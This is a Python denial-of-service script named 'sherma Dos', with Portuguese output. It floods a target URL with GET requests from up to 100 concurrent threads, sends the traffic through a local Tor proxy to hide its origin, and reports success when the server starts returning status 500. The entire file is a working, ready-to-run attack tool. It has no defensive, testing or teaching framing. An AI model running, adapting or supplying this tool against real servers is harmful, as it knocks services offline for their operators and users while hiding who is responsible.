
import requests
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from pyfiglet import figlet_format

print(figlet_format("sherma Dos"))
print("Ative o Tor antes de iniciar o ataque")

DEFAULT_THREADS = 10
MAX_THREADS = 100

try:
    url = sys.argv[1]
    threads = DEFAULT_THREADS
    verbose = False

    for i in range(2, len(sys.argv)):
        if sys.argv[i] == "-v":
            verbose = True
        elif sys.argv[i] == "-t" and i + 1 < len(sys.argv):
            try:
                threads = int(sys.argv[i + 1])
                if threads > MAX_THREADS:
                    print(f"[!] Número de threads muito alto. Limitado para {MAX_THREADS}")
                    threads = MAX_THREADS
                elif threads < 1:
                    print("[!] Número de threads inválido. Usando valor padrão (10)")
                    threads = DEFAULT_THREADS
            except ValueError:
                print("[!] Número de threads inválido. Usando valor padrão (10)")
                threads = DEFAULT_THREADS

except IndexError:
    print("Uso: python sherma.py <url> [-v] [-t <threads>]")
    print("Exemplo: python sherma.py http://exemplo.com -v -t 20")
    sys.exit(1)

print(f"[*] Iniciando ataque com {threads} threads")
print(f"[*] Alvo: {url}")
print("[*] O ataque continuará até o servidor retornar status 500\n")

proxies = {
    "http": "socks5h://127.0.0.1:9050",
    "https": "socks5h://127.0.0.1:9050"
}

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
    "Cache-Control": "no-cache"
}

attack_active = True
successful_attack = False
requests_count = 0
start_time = time.time()

def make_request(thread_id):
    global requests_count, successful_attack, attack_active
    session = requests.Session()

    while attack_active and not successful_attack:
        try:
            response = session.get(url, headers=headers, proxies=proxies, timeout=10)
            requests_count += 1

            if response.status_code == 500:
                successful_attack = True
                attack_active = False
                print(f"\n[SUCESSO!] Servidor derrubado! Status: 500")
                print(f"[+] Thread {thread_id} detectou o status 500")
                print(f"[+] Total de requests enviados: {requests_count}")
                print(f"[+] Tempo total: {time.time() - start_time:.2f} segundos")
                return

            if verbose:
                print(f"[Thread {thread_id}] Status: {response.status_code} | Requests: {requests_count}")

        except requests.exceptions.RequestException as e:
            if verbose:
                print(f"[Thread {thread_id}] Erro: {e}")
            time.sleep(0.1)
        except KeyboardInterrupt:
            print(f"\n[*] Ataque interrompido pelo usuário")
            attack_active = False
            return

def print_stats():
    """Função para mostrar estatísticas a cada 5 segundos"""
    while attack_active and not successful_attack:
        time.sleep(5)
        elapsed_time = time.time() - start_time
        rps = requests_count / elapsed_time if elapsed_time > 0 else 0
        print(f"[STATS] Requests: {requests_count} | RPS: {rps:.1f} | Tempo: {elapsed_time:.1f}s")

try:
    with ThreadPoolExecutor(max_workers=threads) as executor:
        stats_thread = threading.Thread(target=print_stats, daemon=True)
        stats_thread.start()
        futures = [executor.submit(make_request, i) for i in range(threads)]
        
        for future in futures:
            future.result()

except KeyboardInterrupt:
    print(f"\n[*] Ataque interrompido pelo usuário")
    attack_active = False
finally:
    attack_active = False
    elapsed_time = time.time() - start_time
    rps = requests_count / elapsed_time if elapsed_time > 0 else 0

    print(f"\n[RESUMO FINAL]")
    print(f"Status: {'Servidor derrubado' if successful_attack else 'Ataque interrompido'}")
    print(f"Total de requests: {requests_count}")
    print(f"Tempo total: {elapsed_time:.2f} segundos")
    print(f"Requests por segundo: {rps:.1f}") 
